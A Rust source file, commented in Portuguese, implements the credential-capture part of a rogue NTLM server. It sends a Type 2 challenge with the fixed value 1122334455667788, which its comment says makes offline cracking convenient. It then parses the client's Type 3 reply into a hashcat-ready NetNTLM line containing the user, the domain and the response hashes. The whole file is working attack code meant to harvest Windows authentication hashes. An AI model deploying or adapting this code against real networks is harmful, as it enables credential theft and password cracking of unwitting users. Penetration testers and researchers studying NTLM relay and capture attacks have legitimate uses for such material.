//! Construção do desafio NTLMSSP (Type 2) e parsing do Type 3 para hashcat.
use base64::{engine::general_purpose::STANDARD, Engine};

/// Desafio fixo clássico — conveniente para cracking offline.
pub const CHALLENGE: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

/// Mensagem CHALLENGE (Type 2) base64, para o header WWW-Authenticate: NTLM.
pub fn type2_b64() -> String {
    let mut m = Vec::new();
    m.extend_from_slice(b"NTLMSSP\0");
    m.extend_from_slice(&2u32.to_le_bytes()); // type 2
    m.extend_from_slice(&[0, 0, 0, 0]); // TargetName len/maxlen
    m.extend_from_slice(&48u32.to_le_bytes()); // TargetName offset
    let flags: u32 = 0x0000_0001 | 0x0000_0200 | 0x0080_0000 | 0x0000_8000 | 0x0002_0000;
    m.extend_from_slice(&flags.to_le_bytes());
    m.extend_from_slice(&CHALLENGE); // server challenge
    m.extend_from_slice(&[0u8; 8]); // reserved
    m.extend_from_slice(&[0, 0, 0, 0]); // TargetInfo len/maxlen
    m.extend_from_slice(&48u32.to_le_bytes()); // TargetInfo offset
    STANDARD.encode(m)
}

fn utf16le(bytes: &[u8]) -> String {
    let units: Vec<u16> = bytes
        .chunks(2)
        .filter(|c| c.len() == 2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&units)
}

fn sec_buffer(m: &[u8], pos: usize) -> Option<(usize, usize)> {
    if pos + 8 > m.len() {
        return None;
    }
    let len = u16::from_le_bytes([m[pos], m[pos + 1]]) as usize;
    let off = u32::from_le_bytes([m[pos + 4], m[pos + 5], m[pos + 6], m[pos + 7]]) as usize;
    Some((len, off))
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

pub struct Captured {
    pub user: String,
    pub domain: String,
    pub hashcat: String,
}

/// Parseia a mensagem AUTHENTICATE (Type 3) e devolve linha hashcat NetNTLM.
pub fn parse_type3(b64: &str) -> Option<Captured> {
    let m = STANDARD.decode(b64.trim()).ok()?;
    if m.len() < 52 || &m[0..8] != b"NTLMSSP\0" {
        return None;
    }
    if u32::from_le_bytes([m[8], m[9], m[10], m[11]]) != 3 {
        return None;
    }
    let (lm_len, lm_off) = sec_buffer(&m, 12)?;
    let (nt_len, nt_off) = sec_buffer(&m, 20)?;
    let (dom_len, dom_off) = sec_buffer(&m, 28)?;
    let (usr_len, usr_off) = sec_buffer(&m, 36)?;

    let domain = m.get(dom_off..dom_off + dom_len).map(utf16le).unwrap_or_default();
    let user = m.get(usr_off..usr_off + usr_len).map(utf16le).unwrap_or_default();
    let nt = m.get(nt_off..nt_off + nt_len)?;
    let chal_hex = hex(&CHALLENGE);

    let hashcat = if nt_len > 24 {
        let proof = hex(&nt[0..16]);
        let blob = hex(&nt[16..]);
        format!("{user}::{domain}:{chal_hex}:{proof}:{blob}")
    } else if nt_len == 24 {
        let lm = m.get(lm_off..lm_off + lm_len).map(hex).unwrap_or_default();
        let nth = hex(nt);
        format!("{user}::{domain}:{lm}:{nth}:{chal_hex}")
    } else {
        return None;
    };
    Some(Captured { user, domain, hashcat })
}
